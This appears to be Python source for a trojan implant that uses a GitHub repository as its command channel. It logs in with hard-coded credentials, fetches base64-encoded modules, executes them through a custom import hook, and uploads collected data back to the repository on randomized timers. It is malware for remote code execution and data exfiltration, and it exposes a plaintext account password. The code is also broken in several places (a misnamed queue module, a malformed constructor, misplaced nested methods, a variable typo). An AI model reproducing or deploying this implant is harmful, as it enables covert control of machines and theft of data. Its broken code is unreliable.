import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

#set the spider's ID, get configs and modules

spider_id = "spider1"

spider_config = "%s.json" % spider_id
data_path = "data/%s/" % spider_id
spider_modules = []
configured = False
task_queue = queue.Queue()


#connect to github and pick up code - WORKS

def connect_to_github():
    gh = login(username="sindat",password="Lolnet011")
    repo = gh.repository("sindat","loxosceles")
    branch = repo.branch("master")
    print ("CONNECTED!")

    return gh,repo,branch

#find the required json config files - WORKS
def get_file_contents(filepath):

    gh,repo,branch = connect_to_github()
    
    tree = branch.commit.commit.tree.recurse()
    
    for filename in tree.tree:

        if filepath in filename.path:

            print ("[*] Found file " + str(filepath))
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None

#get the config json and decode it
def get_spider_config():
    global configured
    config_json = get_file_contents(spider_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:

        if task['module'] not in sys.modules:

            exec("import %s" % task['module'])

    return config

#push the collected module data into the target machine
def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (spider_id,random.randint(1000,100000))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return

#spread imported libraries to all modules, GitImporter class finds
#and loads the module

class GitImporter(object):
    def ___init___(self):
        self.current_module_code = ""

        def find_module(self,fullname,path=None):
            if configured:
                print ("[*] Attempting to retrieve %s") % fullname

                new_library = get_file_contents("modules/%s" % fullname)

                if new_library is not None:
                    self.current_module_code = base64.b64decode(new_Library)
                    return self

            return None

        def load_module(self,name):

            module = imp.new_module(name)
            exec (self.current_module_code in module.__dict__)
            sys.modules[name] = module

            return module

        def module_runner(module):

            task_queue.put(1)
            result = sys.modules[module].run()
            task_queue.get()

            #store the result in the repo
            store_module_result(result)

            return

            #the main loop of checking for new modules and loading them
        
            sys.meta_path = [GitImporter()]

            while True:

                if task_queue.empty():

                    config = get_spider_config()

                    for task in config:

                        t = threading.Thread(target=module_runner,args=(task['module'],))
                        t.start()
                        time.sleep(random.randint(1,10))

                time.sleep(random.randint(1000,10000))














        









    
